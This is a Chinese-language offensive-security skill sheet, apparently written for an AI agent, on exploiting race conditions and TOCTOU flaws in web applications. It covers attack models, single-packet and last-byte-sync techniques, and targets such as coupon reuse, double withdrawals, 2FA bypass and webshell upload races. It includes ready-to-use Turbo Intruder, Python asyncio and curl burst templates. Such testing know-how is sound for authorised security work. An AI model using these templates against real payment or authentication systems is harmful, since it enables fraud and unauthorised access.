# Race Condition / TOCTOU Specialist

## 核心能力

竞态条件、TOCTOU、时间差攻击 — 支付绕过、权限提升、限流绕过。

## 攻击模型

### TOCTOU (Time-of-Check to Time-of-Use)
```
检查点 (Time A)  →  [竞态窗口]  →  使用点 (Time B)
"余额够吗?"          ← 并发 →       "扣钱"
"优惠券有效?"        ← 并发 →       "使用优惠券"
```

### Single-Endpoint Race
```
# 多次同时请求同一接口
POST /api/redeem-coupon
并发N个请求 → 同一优惠券被使用N次

POST /api/transfer
并发: 余额100 → 转出100×N次
```

### Multi-Endpoint Race
```
# 请求A 和 请求B 同时到
A: POST /api/checkout (检查余额→等待)
B: POST /api/withdraw (提走余额→成功)
A: (余额已为0) 但session里还有 → 下单成功
```

## 利用技术

### 单包攻击 (Single-Packet Attack)
```python
# Turbo Intruder + HTTP/2 单TCP窗口
# 20-30个请求在一个TCP包里到达

POST /api/apply-discount HTTP/2
POST /api/checkout HTTP/2
POST /api/confirm-order HTTP/2
# ↑ 同时到达，后端并行处理
```

### Last-Byte Sync
```
# 发送所有请求的body除了最后一个字节
# 等所有请求就绪 → 同时发送最后一字节

Content-Length: 100
Body: 99 bytes sent... [wait] → send last byte
# 后端同时开始处理
```

### 常见目标
```
# 电商
- 优惠券多次使用
- 余额重复消费
- 库存超卖
- 限购绕过

# 金融
- 转账重复提交
- 提现多次
- 手续费绕过

# 认证
- 限流绕过
- 2FA绕过 (窗口期)
- 密码重置token重复使用
- 邀请码多次使用

# 文件操作
- 文件写入 → 读 → 删除
- tmp文件竞争 (symlink)
- 上传竞争 (先上传webshell→访问→被删)
```

## Payload 模板

### Turbo Intruder (Burp)
```python
# race-single.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Python Async
```python
import asyncio, aiohttp

async def race(session, url, data):
    tasks = []
    for _ in range(30):
        tasks.append(session.post(url, json=data))
    return await asyncio.gather(*tasks)
```

### curl 并行
```bash
seq 1 20 | xargs -P20 -I{} curl -s -X POST URL -d 'data' &
```

## Race Window 放大
```
# 让检查和处理之间时间变长
- 大文件上传 (multipart)
- 慢速body发送
- 触发后端计算 (复杂正则/密码哈希/图片处理)
- 数据库事务隔离级别 (READ COMMITTED)
```

## 工具链
- Burp Suite Turbo Intruder (核心)
- RacePK (自动化race探测)
- HTTP/2 Single-Packet Attack 脚本
- custom Python asyncio脚本
- ffuf (简单并发测试)

## 方法论
1. 找"验证→操作"两步分离的端点
2. 用Turbo Intruder单包并发
3. 逐步加大并发数 (5→20→50→100)
4. 比较并发组和单次请求的结果差异
5. 放大race window → 大文件/大body/触发慢计算
6. 确认利用 → 算经济损失

## 签名
> "如果步骤A是检查、步骤B是操作，那么A和B之间就是你的窗口。" — James Kettle

## 知识库
- `@communitytools/skills/web-app-logic` — 业务逻辑/竞态
